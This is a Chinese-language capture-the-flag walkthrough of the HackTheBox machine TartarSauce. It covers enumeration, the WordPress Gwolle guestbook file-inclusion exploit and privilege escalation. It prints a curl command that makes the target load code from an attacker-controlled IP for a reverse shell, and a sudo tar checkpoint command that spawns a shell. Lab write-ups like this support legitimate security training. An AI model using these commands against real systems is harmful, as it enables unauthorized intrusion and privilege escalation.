---
UID: 20250622082657
aliases: 
tags:
  - 靶场
  - 打靶
  - hackthebox
source: 
cssclasses: 
created: 2025-06-22
---

## 扫描端口
![image.png](https://s2.loli.net/2025/06/22/mYcQoEyfvr3qRGV.png)

只有一个 web 服务

## web 服务信息收集
![image.png](https://s2.loli.net/2025/06/22/NkWexl5gmRqFKhj.png)

看看源码有啥东西吗
![image.png](https://s2.loli.net/2025/06/22/ptEOIlQ9zcKCmTf.png)

好吧，并没有

### 目录扫描
![image.png](https://s2.loli.net/2025/06/22/hQ2RqlHmDJoAKM3.png)


发现有个网站和 wordpress 的网站
![image.png](https://s2.loli.net/2025/06/22/bicG3YHVtUu2mPk.png)

![image.png](https://s2.loli.net/2025/06/22/iFTQehwtH42IAGz.png)

但下面这个 wordpress 的网站是没权限访问
![image.png](https://s2.loli.net/2025/06/22/CtHIoxYq9ZSr8jd.png)

### wpscan 枚举
![image.png](https://s2.loli.net/2025/06/22/idoZpEI48vzyYOJ.png)

枚举出一个用户

但用用户爆破密码没有用

![image.png](https://s2.loli.net/2025/06/22/bYi1LM4dEvC9wtW.png)

也能证明我们是没有权限去访问 wordpress 的网站的

### monstra-3.0.4
第一个网站告诉我们一个信息，就是 monstra-3.0.4

遇到一个登录界面

![image.png](https://s2.loli.net/2025/06/22/BoYvmpZE8FcaVUg.png)

试了一个弱密码 admin/admin 登录进去了

![image.png](https://s2.loli.net/2025/06/22/WXNMwQG2JcEAD5L.png)

找到文件上传点
![image.png](https://s2.loli.net/2025/06/22/zVThspofQDwqEGB.png)


使用这个 poc
![image.png](https://s2.loli.net/2025/06/22/kODjGRxUFXJdB2E.png)

大概就是上传一个 php 7 然后 bp 抓包改后缀

没法上传，连文件夹都访问不了
![image.png](https://s2.loli.net/2025/06/22/lNKIZXvmq28JobD.png)


### wpscan
其实刚刚发现 wordpress 莫名可以用了。就准备从 wordpress 开刀

```
 wpscan --url http://tartarsauce.htb/webservices/wp/ --enumerate p,t,u
 
 枚举出插件、主题和用户
 
 wpscan --url http://tartarsauce.htb/webservices/wp --enumerate p --plugins-detection aggressive
 
 是老版本插件，需要增加参数才能扫描出来
```

	其实一开始也是扫描插件的，就是死活扫不出来，用了参数才扫出来

![image.png](https://s2.loli.net/2025/06/22/zRqphav6YrteNcK.png)

看了 readme 知道，其实这个是 1.5.3 版本
![image.png](https://s2.loli.net/2025/06/22/R8QWBAr6oFSZvnC.png)

![image.png](https://s2.loli.net/2025/06/22/Mihne49BKbdrZyp.png)

符合要求
![image.png](https://s2.loli.net/2025/06/22/aSEicwlyop3WA6m.png)


![image.png](https://s2.loli.net/2025/06/22/vs2nWR8lbF5mQLt.png)

这个的意思就是要写一个 wp-load. php 木马进去


写完木马之后，继续用
```
curl http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.12/
```

获得反弹 shell
![image.png](https://s2.loli.net/2025/06/22/DuR7I5JiaT692Yq.png)

## 提权
![image.png](https://s2.loli.net/2025/06/22/8K4zklVbEgRsFaN.png)

先要想办法升级到 onuma 用户

因为刚刚发现有 wordpress 网站，就优先找一下 wordpress 网站的配置文件

![image.png](https://s2.loli.net/2025/06/22/UkHB3QVEfd81axC.png)


登录进入数据库

![image.png](https://s2.loli.net/2025/06/22/XVgLu4M5fpO36dj.png)

![image.png](https://s2.loli.net/2025/06/22/9dyC1FGO8aKosu7.png)
找到加密的密码，但感觉无关紧要

没啥思路了，sudo -l 发现可以用 tar 提权
![image.png](https://s2.loli.net/2025/06/22/j4SlYER2QdtOwhC.png)

```
sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

![image.png](https://s2.loli.net/2025/06/22/CWihzFojKEYMQy8.png)

切换成功

![image.png](https://s2.loli.net/2025/06/22/EXPoHmhYpItzJ6i.png)

找到 flag

## 提权 root